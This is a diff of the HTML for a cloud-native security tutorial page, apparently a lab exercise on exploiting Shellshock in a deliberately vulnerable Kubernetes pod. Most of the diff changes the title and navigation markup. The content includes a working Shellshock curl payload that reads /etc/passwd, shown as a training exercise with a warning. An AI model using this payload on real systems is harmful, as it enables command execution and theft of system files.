@@ -40,7 +40,7 @@
     
     
       
-        <title>Compromise a pod! - Cloud Native Security Tutorial</title>
+        <title>Compromised pod - Cloud Native Security Tutorial</title>
       
     
     
@@ -115,7 +115,7 @@
             </span>
             <span class="md-header-nav__topic">
               
-                Compromise a pod!
+                Compromised pod
               
             </span>
           
@@ -225,16 +225,35 @@
       
 
 
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1">
+    
+    <label class="md-nav__link" for="nav-1">
+      Home
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-1">
+        Home
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
   <li class="md-nav__item">
     <a href=".." title="Overview" class="md-nav__link">
       Overview
     </a>
   </li>
 
-    
-      
-      
-      
+        
+          
+          
+          
 
 
   <li class="md-nav__item">
@@ -243,10 +262,10 @@
     </a>
   </li>
 
-    
-      
-      
-      
+        
+          
+          
+          
 
 
   <li class="md-nav__item">
@@ -255,10 +274,36 @@
     </a>
   </li>
 
+        
+      </ul>
+    </nav>
+  </li>
+
     
       
       
       
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
+    
+    <label class="md-nav__link" for="nav-2">
+      Exercises
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        Exercises
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
 
   
 
@@ -271,11 +316,11 @@
     
     
       <label class="md-nav__link md-nav__link--active" for="__toc">
-        Compromise a pod!
+        Compromised pod
       </label>
     
-    <a href="./" title="Compromise a pod!" class="md-nav__link md-nav__link--active">
-      Compromise a pod!
+    <a href="./" title="Compromised pod" class="md-nav__link md-nav__link--active">
+      Compromised pod
     </a>
     
       
@@ -326,10 +371,10 @@
     
   </li>
 
-    
-      
-      
-      
+        
+          
+          
+          
 
 
   <li class="md-nav__item">
@@ -338,10 +383,10 @@
     </a>
   </li>
 
-    
-      
-      
-      
+        
+          
+          
+          
 
 
   <li class="md-nav__item">
@@ -350,10 +395,10 @@
     </a>
   </li>
 
-    
-      
-      
-      
+        
+          
+          
+          
 
 
   <li class="md-nav__item">
@@ -362,10 +407,10 @@
     </a>
   </li>
 
-    
-      
-      
-      
+        
+          
+          
+          
 
 
   <li class="md-nav__item">
@@ -374,16 +419,45 @@
     </a>
   </li>
 
+        
+      </ul>
+    </nav>
+  </li>
+
     
       
       
       
 
 
-  <li class="md-nav__item">
-    <a href="../conclusions/" title="Conclusion" class="md-nav__link">
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
+    
+    <label class="md-nav__link" for="nav-3">
       Conclusion
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        Conclusion
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../conclusions/" title="Conclusions" class="md-nav__link">
+      Conclusions
     </a>
+  </li>
+
+        
+      </ul>
+    </nav>
   </li>
 
     
@@ -462,33 +536,41 @@
 <p class="admonition-title">Danger</p>
 <p>DO NOT RUN THIS IN A REAL CLUSTER!</p>
 </div>
-<div class="highlight"><pre><span></span><code>helm install shellshockable https://lizrice.github.io/shellshockable/shellshockable-0.1.0.tgz
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="err">helm install shellshockable https://lizrice.github.io/shellshockable/shellshockable-0.1.0.tgz</span>
 </code></pre></div>
+</td></tr></table>
 
 <p>This will run a deployment with a single pod. It might take a few seconds to pull the image so check that it's up and running (your pod name will be different):</p>
-<div class="highlight"><pre><span></span><code>kubectl get pods
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="err">kubectl get pods</span>
 </code></pre></div>
+</td></tr></table>
 
-<p>You'll see something like this:
-<div class="highlight"><pre><span></span><code>NAME                             READY   STATUS    RESTARTS   AGE
-shellshockable-d5b7d44b4-9rpzd   1/1     Running   0          70s
-</code></pre></div></p>
-<p>In a separate terminal window, run port forwarding so we can make curl requests to this pod. This maps localhost port 8081 to the pod's port 80.</p>
-<div class="highlight"><pre><span></span><code>kubectl port-forward $(kubectl get pods -l app.kubernetes.io/name=shellshockable -o name) 8081:80
+<p>You'll see something like this:</p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="err">NAME                             READY   STATUS    RESTARTS   AGE</span>
+<span class="err">shellshockable-d5b7d44b4-9rpzd   1/1     Running   0          70s</span>
 </code></pre></div>
+</td></tr></table>
+
+<p>In a separate terminal window, run port forwarding so we can make curl requests to this pod. This maps localhost port 8081 to the pod's port 80.</p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="err">kubectl port-forward $(kubectl get pods -l app.kubernetes.io/name=shellshockable -o name) 8081:80</span>
+</code></pre></div>
+</td></tr></table>
 
 <p>You can now use curl (or a browser) to view the web service running on this pod. For example, if you open <a href="localhost:8081">localhost:8081</a> in your web browser, you'll see the Apache2 default welcome page. There is also a <a href="https://github.com/lizrice/shellshockable/blob/gh-pages/cgi-bin/shockme.cgi">script</a> that will return the words "Regular, expected output" at the address <a href="localhost:8081/cgi-bin/shockme.cgi">localhost:8081/cgi-bin/shockme.cgi</a>.</p>
 <p>If you look at the source for the <a href="https://github.com/lizrice/shellshockable/blob/gh-pages/cgi-bin/shockme.cgi">script</a> you'll see that it's executed using <code>bash</code>. This container is using a compromised version of <code>bash</code> with the Shellshock vulnerability, that an attacker can exploit to execute commands.</p>
 <p>First let's see the regular text is returned if we use <code>curl</code> to make the HTTPS request:</p>
-<div class="highlight"><pre><span></span><code>curl localhost:8081/cgi-bin/shockme.cgi
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="err">curl localhost:8081/cgi-bin/shockme.cgi</span>
 </code></pre></div>
+</td></tr></table>
 
 <p>This should show the response <code>Regular, expected output</code></p>
 <p>You've seen the web server return content as expected. Now it's time to act like an attacker and exploit the Shellshock vulnerability.</p>
 <h2 id="exploit-the-vulnerability">Exploit the vulnerability<a class="headerlink" href="#exploit-the-vulnerability" title="Permanent link">&para;</a></h2>
 <p>You can exploit Shellshock by passing a User-Agent header on the <code>curl</code> request with the <code>-A</code> parameter. This gets expanded as an environment variable by <code>bash</code>, and because of the Shellshock vulnerability, it can be used to execute arbitrary commands. For example</p>
-<div class="highlight"><pre><span></span><code>curl -A &quot;() { :; }; echo \&quot;Content-type: text/plain\&quot;; echo; /bin/cat /etc/passwd&quot; localhost:8081/cgi-bin/shockme.cgi
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="err">curl -A &quot;() { :; }; echo \&quot;Content-type: text/plain\&quot;; echo; /bin/cat /etc/passwd&quot; localhost:8081/cgi-bin/shockme.cgi</span>
 </code></pre></div>
+</td></tr></table>
 
 <p>Instead of running the CGI script as normal, this reponds to the HTTP request with the contents of <code>/etc/passwd</code>!</p>
 <h2 id="preventing-this-attack">Preventing this attack<a class="headerlink" href="#preventing-this-attack" title="Permanent link">&para;</a></h2>
